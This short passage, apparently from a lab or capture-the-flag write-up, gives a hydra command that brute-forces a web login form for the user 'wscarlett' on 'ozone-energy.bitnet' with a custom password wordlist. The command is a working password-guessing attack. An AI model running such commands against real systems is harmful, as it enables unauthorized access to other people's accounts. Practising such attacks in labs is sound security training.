With this command we can run the list passwords from list and check the correct password out of it.
hydra -l wscarlett -P /usr/share/wordlists/custom/ozone-wordlist.txt ozone-energy.bitnet http-form-post "/[LOGINPAGE]:username=^USER^&password=^PASS^&Login=Login:Invalid Password" 
